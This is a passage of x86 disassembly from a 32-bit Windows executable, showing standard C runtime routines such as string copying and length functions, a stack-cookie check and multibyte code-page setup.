  4255c8:	and    DWORD PTR [eax],0x0
  4255cb:	mov    eax,ds:0x45e268
  4255d0:	mov    ds:0x45e264,eax
  4255d5:	xor    eax,eax
  4255d7:	ret    
  4255d8:	push   0xc
  4255da:	push   0x4295d0
  4255df:	call   0x425340
  4255e4:	call   0x424651
  4255e9:	and    DWORD PTR [ebp-0x4],0x0
  4255ed:	mov    edi,DWORD PTR [ebp+0x8]
  4255f0:	call   0x425530
  4255f5:	mov    DWORD PTR [ebp-0x1c],eax
  4255f8:	or     DWORD PTR [ebp-0x4],0xffffffff
  4255fc:	call   0x42560a
  425601:	mov    eax,DWORD PTR [ebp-0x1c]
  425604:	call   0x42537b
  425609:	ret    
  42560a:	call   0x42465a
  42560f:	ret    
  425610:	push   DWORD PTR [esp+0x4]
  425614:	call   0x4255d8
  425619:	neg    eax
  42561b:	sbb    eax,eax
  42561d:	neg    eax
  42561f:	pop    ecx
  425620:	dec    eax
  425621:	ret    
  425622:	push   ebp
  425623:	mov    ebp,esp
  425625:	sub    esp,0x10
  425628:	push   ebx
  425629:	xor    ebx,ebx
  42562b:	cmp    DWORD PTR ds:0x45dd70,ebx
  425631:	push   esi
  425632:	push   edi
  425633:	jne    0x4256a2
  425635:	push   0x429640
  42563a:	call   DWORD PTR ds:0x4290b8
  425640:	mov    edi,eax
  425642:	cmp    edi,ebx
  425644:	je     0x4256dd
  42564a:	mov    esi,DWORD PTR ds:0x429020
  425650:	push   0x429634
  425655:	push   edi
  425656:	call   esi
  425658:	test   eax,eax
  42565a:	mov    ds:0x45dd70,eax
  42565f:	je     0x4256dd
  425661:	push   0x429624
  425666:	push   edi
  425667:	call   esi
  425669:	push   0x429610
  42566e:	push   edi
  42566f:	mov    ds:0x45dd74,eax
  425674:	call   esi
  425676:	cmp    DWORD PTR ds:0x45dac4,0x2
  42567d:	mov    ds:0x45dd78,eax
  425682:	jne    0x4256a2
  425684:	push   0x4295f4
  425689:	push   edi
  42568a:	call   esi
  42568c:	test   eax,eax
  42568e:	mov    ds:0x45dd80,eax
  425693:	je     0x4256a2
  425695:	push   0x4295dc
  42569a:	push   edi
  42569b:	call   esi
  42569d:	mov    ds:0x45dd7c,eax
  4256a2:	mov    eax,ds:0x45dd7c
  4256a7:	test   eax,eax
  4256a9:	je     0x4256e7
  4256ab:	call   eax
  4256ad:	test   eax,eax
  4256af:	je     0x4256ce
  4256b1:	lea    ecx,[ebp-0x4]
  4256b4:	push   ecx
  4256b5:	push   0xc
  4256b7:	lea    ecx,[ebp-0x10]
  4256ba:	push   ecx
  4256bb:	push   0x1
  4256bd:	push   eax
  4256be:	call   DWORD PTR ds:0x45dd80
  4256c4:	test   eax,eax
  4256c6:	je     0x4256ce
  4256c8:	test   BYTE PTR [ebp-0x8],0x1
  4256cc:	jne    0x4256e7
  4256ce:	cmp    DWORD PTR ds:0x45dad0,0x4
  4256d5:	jb     0x4256e1
  4256d7:	or     BYTE PTR [ebp+0x12],0x20
  4256db:	jmp    0x425706
  4256dd:	xor    eax,eax
  4256df:	jmp    0x425716
  4256e1:	or     BYTE PTR [ebp+0x12],0x4
  4256e5:	jmp    0x425706
  4256e7:	mov    eax,ds:0x45dd74
  4256ec:	test   eax,eax
  4256ee:	je     0x425706
  4256f0:	call   eax
  4256f2:	mov    ebx,eax
  4256f4:	test   ebx,ebx
  4256f6:	je     0x425706
  4256f8:	mov    eax,ds:0x45dd78
  4256fd:	test   eax,eax
  4256ff:	je     0x425706
  425701:	push   ebx
  425702:	call   eax
  425704:	mov    ebx,eax
  425706:	push   DWORD PTR [ebp+0x10]
  425709:	push   DWORD PTR [ebp+0xc]
  42570c:	push   DWORD PTR [ebp+0x8]
  42570f:	push   ebx
  425710:	call   DWORD PTR ds:0x45dd70
  425716:	pop    edi
  425717:	pop    esi
  425718:	pop    ebx
  425719:	leave  
  42571a:	ret    
  42571b:	int3   
  42571c:	int3   
  42571d:	int3   
  42571e:	int3   
  42571f:	int3   
  425720:	push   edi
  425721:	mov    edi,DWORD PTR [esp+0x8]
  425725:	jmp    0x425795
  425727:	lea    esp,[esp+0x0]
  42572e:	mov    edi,edi
  425730:	mov    ecx,DWORD PTR [esp+0x4]
  425734:	push   edi
  425735:	test   ecx,0x3
  42573b:	je     0x425750
  42573d:	mov    al,BYTE PTR [ecx]
  42573f:	add    ecx,0x1
  425742:	test   al,al
  425744:	je     0x425783
  425746:	test   ecx,0x3
  42574c:	jne    0x42573d
  42574e:	mov    edi,edi
  425750:	mov    eax,DWORD PTR [ecx]
  425752:	mov    edx,0x7efefeff
  425757:	add    edx,eax
  425759:	xor    eax,0xffffffff
  42575c:	xor    eax,edx
  42575e:	add    ecx,0x4
  425761:	test   eax,0x81010100
  425766:	je     0x425750
  425768:	mov    eax,DWORD PTR [ecx-0x4]
  42576b:	test   al,al
  42576d:	je     0x425792
  42576f:	test   ah,ah
  425771:	je     0x42578d
  425773:	test   eax,0xff0000
  425778:	je     0x425788
  42577a:	test   eax,0xff000000
  42577f:	je     0x425783
  425781:	jmp    0x425750
  425783:	lea    edi,[ecx-0x1]
  425786:	jmp    0x425795
  425788:	lea    edi,[ecx-0x2]
  42578b:	jmp    0x425795
  42578d:	lea    edi,[ecx-0x3]
  425790:	jmp    0x425795
  425792:	lea    edi,[ecx-0x4]
  425795:	mov    ecx,DWORD PTR [esp+0xc]
  425799:	test   ecx,0x3
  42579f:	je     0x4257be
  4257a1:	mov    dl,BYTE PTR [ecx]
  4257a3:	add    ecx,0x1
  4257a6:	test   dl,dl
  4257a8:	je     0x425810
  4257aa:	mov    BYTE PTR [edi],dl
  4257ac:	add    edi,0x1
  4257af:	test   ecx,0x3
  4257b5:	jne    0x4257a1
  4257b7:	jmp    0x4257be
  4257b9:	mov    DWORD PTR [edi],edx
  4257bb:	add    edi,0x4
  4257be:	mov    edx,0x7efefeff
  4257c3:	mov    eax,DWORD PTR [ecx]
  4257c5:	add    edx,eax
  4257c7:	xor    eax,0xffffffff
  4257ca:	xor    eax,edx
  4257cc:	mov    edx,DWORD PTR [ecx]
  4257ce:	add    ecx,0x4
  4257d1:	test   eax,0x81010100
  4257d6:	je     0x4257b9
  4257d8:	test   dl,dl
  4257da:	je     0x425810
  4257dc:	test   dh,dh
  4257de:	je     0x425807
  4257e0:	test   edx,0xff0000
  4257e6:	je     0x4257fa
  4257e8:	test   edx,0xff000000
  4257ee:	je     0x4257f2
  4257f0:	jmp    0x4257b9
  4257f2:	mov    DWORD PTR [edi],edx
  4257f4:	mov    eax,DWORD PTR [esp+0x8]
  4257f8:	pop    edi
  4257f9:	ret    
  4257fa:	mov    WORD PTR [edi],dx
  4257fd:	mov    eax,DWORD PTR [esp+0x8]
  425801:	mov    BYTE PTR [edi+0x2],0x0
  425805:	pop    edi
  425806:	ret    
  425807:	mov    WORD PTR [edi],dx
  42580a:	mov    eax,DWORD PTR [esp+0x8]
  42580e:	pop    edi
  42580f:	ret    
  425810:	mov    BYTE PTR [edi],dl
  425812:	mov    eax,DWORD PTR [esp+0x8]
  425816:	pop    edi
  425817:	ret    
  425818:	int3   
  425819:	int3   
  42581a:	int3   
  42581b:	int3   
  42581c:	int3   
  42581d:	int3   
  42581e:	int3   
  42581f:	int3   
  425820:	mov    ecx,DWORD PTR [esp+0xc]
  425824:	push   edi
  425825:	test   ecx,ecx
  425827:	je     0x4258bf
  42582d:	push   esi
  42582e:	push   ebx
  42582f:	mov    ebx,ecx
  425831:	mov    esi,DWORD PTR [esp+0x14]
  425835:	test   esi,0x3
  42583b:	mov    edi,DWORD PTR [esp+0x10]
  42583f:	jne    0x42584c
  425841:	shr    ecx,0x2
  425844:	jne    0x4258cf
  42584a:	jmp    0x425873
  42584c:	mov    al,BYTE PTR [esi]
  42584e:	add    esi,0x1
  425851:	mov    BYTE PTR [edi],al
  425853:	add    edi,0x1
  425856:	sub    ecx,0x1
  425859:	je     0x425886
  42585b:	test   al,al
  42585d:	je     0x42588e
  42585f:	test   esi,0x3
  425865:	jne    0x42584c
  425867:	mov    ebx,ecx
  425869:	shr    ecx,0x2
  42586c:	jne    0x4258cf
  42586e:	and    ebx,0x3
  425871:	je     0x425886
  425873:	mov    al,BYTE PTR [esi]
  425875:	add    esi,0x1
  425878:	mov    BYTE PTR [edi],al
  42587a:	add    edi,0x1
  42587d:	test   al,al
  42587f:	je     0x4258b8
  425881:	sub    ebx,0x1
  425884:	jne    0x425873
  425886:	mov    eax,DWORD PTR [esp+0x10]
  42588a:	pop    ebx
  42588b:	pop    esi
  42588c:	pop    edi
  42588d:	ret    
  42588e:	test   edi,0x3
  425894:	je     0x4258ac
  425896:	mov    BYTE PTR [edi],al
  425898:	add    edi,0x1
  42589b:	sub    ecx,0x1
  42589e:	je     0x42593c
  4258a4:	test   edi,0x3
  4258aa:	jne    0x425896
  4258ac:	mov    ebx,ecx
  4258ae:	shr    ecx,0x2
  4258b1:	jne    0x425927
  4258b3:	mov    BYTE PTR [edi],al
  4258b5:	add    edi,0x1
  4258b8:	sub    ebx,0x1
  4258bb:	jne    0x4258b3
  4258bd:	pop    ebx
  4258be:	pop    esi
  4258bf:	mov    eax,DWORD PTR [esp+0x8]
  4258c3:	pop    edi
  4258c4:	ret    
  4258c5:	mov    DWORD PTR [edi],edx
  4258c7:	add    edi,0x4
  4258ca:	sub    ecx,0x1
  4258cd:	je     0x42586e
  4258cf:	mov    edx,0x7efefeff
  4258d4:	mov    eax,DWORD PTR [esi]
  4258d6:	add    edx,eax
  4258d8:	xor    eax,0xffffffff
  4258db:	xor    eax,edx
  4258dd:	mov    edx,DWORD PTR [esi]
  4258df:	add    esi,0x4
  4258e2:	test   eax,0x81010100
  4258e7:	je     0x4258c5
  4258e9:	test   dl,dl
  4258eb:	je     0x425919
  4258ed:	test   dh,dh
  4258ef:	je     0x42590f
  4258f1:	test   edx,0xff0000
  4258f7:	je     0x425905
  4258f9:	test   edx,0xff000000
  4258ff:	jne    0x4258c5
  425901:	mov    DWORD PTR [edi],edx
  425903:	jmp    0x42591d
  425905:	and    edx,0xffff
  42590b:	mov    DWORD PTR [edi],edx
  42590d:	jmp    0x42591d
  42590f:	and    edx,0xff
  425915:	mov    DWORD PTR [edi],edx
  425917:	jmp    0x42591d
  425919:	xor    edx,edx
  42591b:	mov    DWORD PTR [edi],edx
  42591d:	add    edi,0x4
  425920:	xor    eax,eax
  425922:	sub    ecx,0x1
  425925:	je     0x425933
  425927:	xor    eax,eax
  425929:	mov    DWORD PTR [edi],eax
  42592b:	add    edi,0x4
  42592e:	sub    ecx,0x1
  425931:	jne    0x425929
  425933:	and    ebx,0x3
  425936:	jne    0x4258b3
  42593c:	mov    eax,DWORD PTR [esp+0x10]
  425940:	pop    ebx
  425941:	pop    esi
  425942:	pop    edi
  425943:	ret    
  425944:	int3   
  425945:	int3   
  425946:	int3   
  425947:	int3   
  425948:	int3   
  425949:	int3   
  42594a:	int3   
  42594b:	int3   
  42594c:	int3   
  42594d:	int3   
  42594e:	int3   
  42594f:	int3   
  425950:	mov    ecx,DWORD PTR [esp+0x4]
  425954:	test   ecx,0x3
  42595a:	je     0x425980
  42595c:	mov    al,BYTE PTR [ecx]
  42595e:	add    ecx,0x1
  425961:	test   al,al
  425963:	je     0x4259b3
  425965:	test   ecx,0x3
  42596b:	jne    0x42595c
  42596d:	add    eax,0x0
  425972:	lea    esp,[esp+0x0]
  425979:	lea    esp,[esp+0x0]
  425980:	mov    eax,DWORD PTR [ecx]
  425982:	mov    edx,0x7efefeff
  425987:	add    edx,eax
  425989:	xor    eax,0xffffffff
  42598c:	xor    eax,edx
  42598e:	add    ecx,0x4
  425991:	test   eax,0x81010100
  425996:	je     0x425980
  425998:	mov    eax,DWORD PTR [ecx-0x4]
  42599b:	test   al,al
  42599d:	je     0x4259d1
  42599f:	test   ah,ah
  4259a1:	je     0x4259c7
  4259a3:	test   eax,0xff0000
  4259a8:	je     0x4259bd
  4259aa:	test   eax,0xff000000
  4259af:	je     0x4259b3
  4259b1:	jmp    0x425980
  4259b3:	lea    eax,[ecx-0x1]
  4259b6:	mov    ecx,DWORD PTR [esp+0x4]
  4259ba:	sub    eax,ecx
  4259bc:	ret    
  4259bd:	lea    eax,[ecx-0x2]
  4259c0:	mov    ecx,DWORD PTR [esp+0x4]
  4259c4:	sub    eax,ecx
  4259c6:	ret    
  4259c7:	lea    eax,[ecx-0x3]
  4259ca:	mov    ecx,DWORD PTR [esp+0x4]
  4259ce:	sub    eax,ecx
  4259d0:	ret    
  4259d1:	lea    eax,[ecx-0x4]
  4259d4:	mov    ecx,DWORD PTR [esp+0x4]
  4259d8:	sub    eax,ecx
  4259da:	ret    
  4259db:	push   0x8
  4259dd:	push   0x429650
  4259e2:	call   0x425340
  4259e7:	and    DWORD PTR [ebp-0x4],0x0
  4259eb:	push   0x0
  4259ed:	push   0x1
  4259ef:	call   0x427562
  4259f4:	pop    ecx
  4259f5:	pop    ecx
  4259f6:	jmp    0x4259ff
  4259f8:	xor    eax,eax
  4259fa:	inc    eax
  4259fb:	ret    
  4259fc:	mov    esp,DWORD PTR [ebp-0x18]
  4259ff:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a03:	push   0x3
  425a05:	call   DWORD PTR ds:0x429058
  425a0b:	int3   
  425a0c:	cmp    ecx,DWORD PTR ds:0x45d430
  425a12:	jne    0x425a15
  425a14:	ret    
  425a15:	jmp    0x4259db
  425a1a:	movzx  eax,BYTE PTR [esp+0x4]
  425a1f:	mov    cl,BYTE PTR [esp+0xc]
  425a23:	test   BYTE PTR [eax+0x45df21],cl
  425a29:	jne    0x425a47
  425a2b:	cmp    DWORD PTR [esp+0x8],0x0
  425a30:	je     0x425a40
  425a32:	movzx  eax,WORD PTR [eax*2+0x429a4a]
  425a3a:	and    eax,DWORD PTR [esp+0x8]
  425a3e:	jmp    0x425a42
  425a40:	xor    eax,eax
  425a42:	test   eax,eax
  425a44:	jne    0x425a47
  425a46:	ret    
  425a47:	xor    eax,eax
  425a49:	inc    eax
  425a4a:	ret    
  425a4b:	push   0x4
  425a4d:	push   0x0
  425a4f:	push   DWORD PTR [esp+0xc]
  425a53:	call   0x425a1a
  425a58:	add    esp,0xc
  425a5b:	ret    
  425a5c:	sub    eax,0x3a4
  425a61:	je     0x425a85
  425a63:	sub    eax,0x4
  425a66:	je     0x425a7f
  425a68:	sub    eax,0xd
  425a6b:	je     0x425a79
  425a6d:	dec    eax
  425a6e:	je     0x425a73
  425a70:	xor    eax,eax
  425a72:	ret    
  425a73:	mov    eax,0x404
  425a78:	ret    
  425a79:	mov    eax,0x412
  425a7e:	ret    
  425a7f:	mov    eax,0x804
  425a84:	ret    
  425a85:	mov    eax,0x411
  425a8a:	ret    
  425a8b:	push   edi
  425a8c:	push   0x40
  425a8e:	xor    eax,eax
  425a90:	pop    ecx
  425a91:	mov    edi,0x45df20
  425a96:	rep stos DWORD PTR es:[edi],eax
  425a98:	stos   BYTE PTR es:[edi],al
  425a99:	xor    eax,eax
  425a9b:	mov    ds:0x45e024,eax
  425aa0:	mov    ds:0x45df1c,eax
  425aa5:	mov    ds:0x45df14,eax
  425aaa:	mov    edi,0x45e030
  425aaf:	stos   DWORD PTR es:[edi],eax
  425ab0:	stos   DWORD PTR es:[edi],eax
  425ab1:	stos   DWORD PTR es:[edi],eax
  425ab2:	pop    edi
  425ab3:	ret    
  425ab4:	push   ebp
  425ab5:	mov    ebp,esp
  425ab7:	sub    esp,0x518
  425abd:	mov    eax,ds:0x45d430
  425ac2:	xor    eax,DWORD PTR [ebp+0x4]
  425ac5:	push   esi
  425ac6:	mov    DWORD PTR [ebp-0x4],eax
  425ac9:	lea    eax,[ebp-0x18]
  425acc:	push   eax
  425acd:	push   DWORD PTR ds:0x45e024
  425ad3:	call   DWORD PTR ds:0x4290c4
  425ad9:	cmp    eax,0x1
  425adc:	mov    esi,0x100
  425ae1:	jne    0x425bf4
  425ae7:	xor    eax,eax
  425ae9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425af0:	inc    eax
  425af1:	cmp    eax,esi
  425af3:	jb     0x425ae9
  425af5:	mov    al,BYTE PTR [ebp-0x12]
  425af8:	test   al,al
  425afa:	mov    BYTE PTR [ebp-0x118],0x20
  425b01:	je     0x425b39
  425b03:	push   ebx
  425b04:	lea    edx,[ebp-0x11]
  425b07:	push   edi
  425b08:	movzx  ecx,BYTE PTR [edx]
  425b0b:	movzx  eax,al
  425b0e:	cmp    eax,ecx
  425b10:	ja     0x425b2f
  425b12:	sub    ecx,eax
  425b14:	inc    ecx
  425b15:	mov    ebx,ecx
  425b17:	shr    ecx,0x2
  425b1a:	lea    edi,[ebp+eax*1-0x118]
  425b21:	mov    eax,0x20202020
  425b26:	rep stos DWORD PTR es:[edi],eax
  425b28:	mov    ecx,ebx
  425b2a:	and    ecx,0x3
  425b2d:	rep stos BYTE PTR es:[edi],al
  425b2f:	inc    edx
  425b30:	mov    al,BYTE PTR [edx]
  425b32:	inc    edx
  425b33:	test   al,al
  425b35:	jne    0x425b08
  425b37:	pop    edi
  425b38:	pop    ebx
  425b39:	push   0x0
  425b3b:	push   DWORD PTR ds:0x45df14
  425b41:	lea    eax,[ebp-0x518]
  425b47:	push   DWORD PTR ds:0x45e024
  425b4d:	push   eax
  425b4e:	push   esi
  425b4f:	lea    eax,[ebp-0x118]
  425b55:	push   eax
  425b56:	push   0x1
  425b58:	call   0x427a68
  425b5d:	push   0x0
  425b5f:	push   DWORD PTR ds:0x45e024
  425b65:	lea    eax,[ebp-0x218]
  425b6b:	push   esi
  425b6c:	push   eax
  425b6d:	push   esi
  425b6e:	lea    eax,[ebp-0x118]
  425b74:	push   eax
  425b75:	push   esi
  425b76:	push   DWORD PTR ds:0x45df14
  425b7c:	call   0x4276ac
  425b81:	push   0x0
  425b83:	push   DWORD PTR ds:0x45e024
  425b89:	lea    eax,[ebp-0x318]
  425b8f:	push   esi
  425b90:	push   eax
  425b91:	push   esi
  425b92:	lea    eax,[ebp-0x118]
  425b98:	push   eax
  425b99:	push   0x200
  425b9e:	push   DWORD PTR ds:0x45df14
  425ba4:	call   0x4276ac
  425ba9:	add    esp,0x5c
  425bac:	xor    eax,eax
  425bae:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425bb6:	test   cl,0x1
  425bb9:	je     0x425bd1
  425bbb:	or     BYTE PTR [eax+0x45df21],0x10
  425bc2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425bc9:	mov    BYTE PTR [eax+0x45e040],cl
  425bcf:	jmp    0x425bed
  425bd1:	test   cl,0x2
  425bd4:	je     0x425be6
  425bd6:	or     BYTE PTR [eax+0x45df21],0x20
  425bdd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425be4:	jmp    0x425bc9
  425be6:	and    BYTE PTR [eax+0x45e040],0x0
  425bed:	inc    eax
  425bee:	cmp    eax,esi
  425bf0:	jb     0x425bae
  425bf2:	jmp    0x425c38
  425bf4:	xor    eax,eax
  425bf6:	cmp    eax,0x41
  425bf9:	jb     0x425c14
  425bfb:	cmp    eax,0x5a
  425bfe:	ja     0x425c14
  425c00:	or     BYTE PTR [eax+0x45df21],0x10
  425c07:	mov    cl,al
  425c09:	add    cl,0x20
  425c0c:	mov    BYTE PTR [eax+0x45e040],cl
  425c12:	jmp    0x425c33
  425c14:	cmp    eax,0x61
  425c17:	jb     0x425c2c
  425c19:	cmp    eax,0x7a
  425c1c:	ja     0x425c2c
  425c1e:	or     BYTE PTR [eax+0x45df21],0x20
  425c25:	mov    cl,al
  425c27:	sub    cl,0x20
  425c2a:	jmp    0x425c0c
  425c2c:	and    BYTE PTR [eax+0x45e040],0x0
  425c33:	inc    eax
  425c34:	cmp    eax,esi
  425c36:	jb     0x425bf6
  425c38:	mov    ecx,DWORD PTR [ebp-0x4]
  425c3b:	xor    ecx,DWORD PTR [ebp+0x4]
  425c3e:	pop    esi
  425c3f:	call   0x425a0c
  425c44:	leave  
  425c45:	ret    
  425c46:	push   ebp
  425c47:	mov    ebp,esp
  425c49:	sub    esp,0x1c
  425c4c:	mov    eax,ds:0x45d430
  425c51:	xor    eax,DWORD PTR [ebp+0x4]
  425c54:	push   ebx
  425c55:	push   esi
  425c56:	mov    esi,DWORD PTR [ebp+0x8]
  425c59:	xor    ebx,ebx
  425c5b:	cmp    esi,ebx
  425c5d:	mov    DWORD PTR [ebp-0x4],eax
  425c60:	push   edi
  425c61:	je     0x425dbb
  425c67:	xor    edx,edx
  425c69:	xor    eax,eax
  425c6b:	cmp    DWORD PTR [eax+0x45d440],esi
  425c71:	je     0x425cd8
  425c73:	add    eax,0x30
  425c76:	inc    edx
  425c77:	cmp    eax,0xf0
  425c7c:	jb     0x425c6b
  425c7e:	lea    eax,[ebp-0x1c]
  425c81:	push   eax
  425c82:	push   esi
  425c83:	call   DWORD PTR ds:0x4290c4
  425c89:	cmp    eax,0x1
  425c8c:	jne    0x425db3
  425c92:	push   0x40
  425c94:	xor    eax,eax
  425c96:	cmp    DWORD PTR [ebp-0x1c],0x1
  425c9a:	pop    ecx
  425c9b:	mov    edi,0x45df20
  425ca0:	rep stos DWORD PTR es:[edi],eax
  425ca2:	stos   BYTE PTR es:[edi],al
  425ca3:	mov    DWORD PTR ds:0x45e024,esi
  425ca9:	mov    DWORD PTR ds:0x45df14,ebx
  425caf:	jbe    0x425da1
  425cb5:	cmp    BYTE PTR [ebp-0x16],0x0
  425cb9:	je     0x425d79
  425cbf:	lea    ecx,[ebp-0x15]
  425cc2:	mov    dl,BYTE PTR [ecx]
  425cc4:	test   dl,dl
  425cc6:	je     0x425d79
  425ccc:	movzx  eax,BYTE PTR [ecx-0x1]
  425cd0:	movzx  edx,dl
  425cd3:	jmp    0x425d69
  425cd8:	push   0x40
  425cda:	xor    eax,eax
  425cdc:	pop    ecx
  425cdd:	mov    edi,0x45df20
  425ce2:	rep stos DWORD PTR es:[edi],eax
  425ce4:	lea    ecx,[edx+edx*2]
  425ce7:	shl    ecx,0x4
  425cea:	mov    DWORD PTR [ebp-0x8],ebx
  425ced:	stos   BYTE PTR es:[edi],al
  425cee:	lea    ebx,[ecx+0x45d450]
  425cf4:	mov    al,BYTE PTR [ebx]
  425cf6:	mov    esi,ebx
  425cf8:	jmp    0x425d23
  425cfa:	mov    dl,BYTE PTR [esi+0x1]
  425cfd:	test   dl,dl
  425cff:	je     0x425d27
  425d01:	movzx  eax,al
  425d04:	movzx  edi,dl
  425d07:	cmp    eax,edi
  425d09:	ja     0x425d1f
  425d0b:	mov    edx,DWORD PTR [ebp-0x8]
  425d0e:	mov    dl,BYTE PTR [edx+0x45d438]
  425d14:	or     BYTE PTR [eax+0x45df21],dl
  425d1a:	inc    eax
  425d1b:	cmp    eax,edi
  425d1d:	jbe    0x425d14
  425d1f:	inc    esi
  425d20:	inc    esi
  425d21:	mov    al,BYTE PTR [esi]
  425d23:	test   al,al
  425d25:	jne    0x425cfa
  425d27:	inc    DWORD PTR [ebp-0x8]
  425d2a:	add    ebx,0x8
  425d2d:	cmp    DWORD PTR [ebp-0x8],0x4
  425d31:	jb     0x425cf4
  425d33:	mov    eax,DWORD PTR [ebp+0x8]
  425d36:	mov    ds:0x45e024,eax
  425d3b:	mov    DWORD PTR ds:0x45df1c,0x1
  425d45:	call   0x425a5c
  425d4a:	lea    ecx,[ecx+0x45d444]
  425d50:	mov    esi,ecx
  425d52:	mov    edi,0x45e030
  425d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d59:	mov    ds:0x45df14,eax
  425d5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d5f:	jmp    0x425dc0
  425d61:	or     BYTE PTR [eax+0x45df21],0x4
  425d68:	inc    eax
  425d69:	cmp    eax,edx
  425d6b:	jbe    0x425d61
  425d6d:	inc    ecx
  425d6e:	inc    ecx
  425d6f:	cmp    BYTE PTR [ecx-0x1],0x0
  425d73:	jne    0x425cc2
  425d79:	xor    ecx,ecx
  425d7b:	inc    ecx
  425d7c:	mov    eax,ecx
  425d7e:	or     BYTE PTR [eax+0x45df21],0x8
  425d85:	inc    eax
  425d86:	cmp    eax,0xff
  425d8b:	jb     0x425d7e
  425d8d:	mov    eax,esi
  425d8f:	call   0x425a5c
  425d94:	mov    ds:0x45df14,eax
  425d99:	mov    DWORD PTR ds:0x45df1c,ecx
  425d9f:	jmp    0x425da7
  425da1:	mov    DWORD PTR ds:0x45df1c,ebx
  425da7:	xor    eax,eax
  425da9:	mov    edi,0x45e030
  425dae:	stos   DWORD PTR es:[edi],eax
  425daf:	stos   DWORD PTR es:[edi],eax
  425db0:	stos   DWORD PTR es:[edi],eax
  425db1:	jmp    0x425dc0
  425db3:	cmp    DWORD PTR ds:0x45dd84,ebx
  425db9:	je     0x425dc9
  425dbb:	call   0x425a8b
  425dc0:	call   0x425ab4
  425dc5:	xor    eax,eax
  425dc7:	jmp    0x425dcc
  425dc9:	or     eax,0xffffffff
  425dcc:	mov    ecx,DWORD PTR [ebp-0x4]
  425dcf:	xor    ecx,DWORD PTR [ebp+0x4]
  425dd2:	pop    edi
  425dd3:	pop    esi
  425dd4:	pop    ebx
  425dd5:	call   0x425a0c
  425dda:	leave  
  425ddb:	ret    
  425ddc:	push   0x14
  425dde:	push   0x429660
  425de3:	call   0x425340
  425de8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425dec:	push   0xd
  425dee:	call   0x4254ff
  425df3:	pop    ecx
  425df4:	xor    edi,edi
  425df6:	mov    DWORD PTR [ebp-0x4],edi
  425df9:	mov    DWORD PTR ds:0x45dd84,edi
  425dff:	mov    eax,DWORD PTR [ebp+0x8]
  425e02:	cmp    eax,0xfffffffe
  425e05:	jne    0x425e19
  425e07:	mov    DWORD PTR ds:0x45dd84,0x1
  425e11:	call   DWORD PTR ds:0x4290c0
  425e17:	jmp    0x425e44
  425e19:	cmp    eax,0xfffffffd
  425e1c:	jne    0x425e30
  425e1e:	mov    DWORD PTR ds:0x45dd84,0x1
  425e28:	call   DWORD PTR ds:0x4290bc
  425e2e:	jmp    0x425e44
  425e30:	cmp    eax,0xfffffffc
  425e33:	jne    0x425e44
  425e35:	mov    DWORD PTR ds:0x45dd84,0x1
  425e3f:	mov    eax,ds:0x45ddb4
  425e44:	mov    DWORD PTR [ebp+0x8],eax
  425e47:	cmp    eax,DWORD PTR ds:0x45e024
  425e4d:	je     0x425f0e
  425e53:	mov    esi,DWORD PTR ds:0x45df18
  425e59:	mov    DWORD PTR [ebp-0x20],esi
  425e5c:	cmp    esi,edi
  425e5e:	je     0x425e64
  425e60:	cmp    DWORD PTR [esi],edi
  425e62:	je     0x425e74
  425e64:	push   0x220
  425e69:	call   0x426062
  425e6e:	pop    ecx
  425e6f:	mov    esi,eax
  425e71:	mov    DWORD PTR [ebp-0x20],esi
  425e74:	cmp    esi,edi
  425e76:	je     0x425ef7
  425e78:	push   DWORD PTR [ebp+0x8]
  425e7b:	call   0x425c46
  425e80:	pop    ecx
  425e81:	mov    DWORD PTR [ebp-0x1c],eax
  425e84:	cmp    eax,edi
  425e86:	jne    0x425ef7
  425e88:	mov    DWORD PTR [esi],edi
  425e8a:	mov    eax,ds:0x45e024
  425e8f:	mov    DWORD PTR [esi+0x4],eax
  425e92:	mov    eax,ds:0x45df1c
  425e97:	mov    DWORD PTR [esi+0x8],eax
  425e9a:	mov    eax,ds:0x45df14
  425e9f:	mov    DWORD PTR [esi+0xc],eax
  425ea2:	xor    eax,eax
  425ea4:	mov    DWORD PTR [ebp-0x24],eax
  425ea7:	cmp    eax,0x5
  425eaa:	jge    0x425ebc
  425eac:	mov    cx,WORD PTR [eax*2+0x45e030]
  425eb4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425eb9:	inc    eax
  425eba:	jmp    0x425ea4
  425ebc:	xor    eax,eax
  425ebe:	mov    DWORD PTR [ebp-0x24],eax
  425ec1:	cmp    eax,0x101
  425ec6:	jge    0x425ed5
  425ec8:	mov    cl,BYTE PTR [eax+0x45df20]
  425ece:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425ed2:	inc    eax
  425ed3:	jmp    0x425ebe
  425ed5:	xor    eax,eax
  425ed7:	mov    DWORD PTR [ebp-0x24],eax
  425eda:	cmp    eax,0x100
  425edf:	jge    0x425ef1
  425ee1:	mov    cl,BYTE PTR [eax+0x45e040]
  425ee7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425eee:	inc    eax
  425eef:	jmp    0x425ed7
  425ef1:	mov    DWORD PTR ds:0x45df18,esi
  425ef7:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425efb:	jne    0x425f11
  425efd:	cmp    esi,DWORD PTR ds:0x45df18
  425f03:	je     0x425f11
  425f05:	push   esi
  425f06:	call   0x425f4a
  425f0b:	pop    ecx
  425f0c:	jmp    0x425f11
  425f0e:	mov    DWORD PTR [ebp-0x1c],edi
  425f11:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f15:	call   0x425f23
  425f1a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f1d:	call   0x42537b
  425f22:	ret    
  425f23:	push   0xd
  425f25:	call   0x42546b
  425f2a:	pop    ecx
  425f2b:	ret    
  425f2c:	cmp    DWORD PTR ds:0x45e26c,0x0
  425f33:	jne    0x425f47
  425f35:	push   0xfffffffd
  425f37:	call   0x425ddc
  425f3c:	pop    ecx
  425f3d:	mov    DWORD PTR ds:0x45e26c,0x1
  425f47:	xor    eax,eax
  425f49:	ret    
  425f4a:	push   0xc
  425f4c:	push   0x429670
  425f51:	call   0x425340
  425f56:	mov    esi,DWORD PTR [ebp+0x8]
  425f59:	test   esi,esi
  425f5b:	je     0x425fb5
